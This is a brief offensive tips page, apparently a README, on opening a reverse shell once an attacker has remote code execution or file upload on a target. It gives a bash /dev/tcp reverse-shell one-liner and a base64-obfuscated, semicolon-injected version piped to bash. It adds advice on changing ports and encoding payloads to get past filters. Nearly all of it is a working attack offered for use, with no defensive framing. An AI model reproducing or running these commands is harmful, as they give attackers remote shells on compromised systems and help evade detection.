# TIPS 

If you have obtained a vulnerability such as RCE, file upload or something else, you can use the script below to spawn a shell or backconnect revershell. If the shell does not run see below

1. Make sure the target has internet access (internet access opened)
2. Try changing the port to a larger one such as 8080, 8888, etc. 
3. Encode your script using base64 and then decode it 3. 
4. Encode your script using url encode 

## Script 1 

```
sh -i >& /dev/tcp/<YOUR HOST OR IP>/<PORT> 0>&1
```

## Script 2

```
; echo c2ggLWkgPiYgL2Rldi90Y3AvPFlPVVIgSE9TVCBPUiBJUD4vPFBPUlQ+IDA+JjE= | base64 -d | bash;"
```
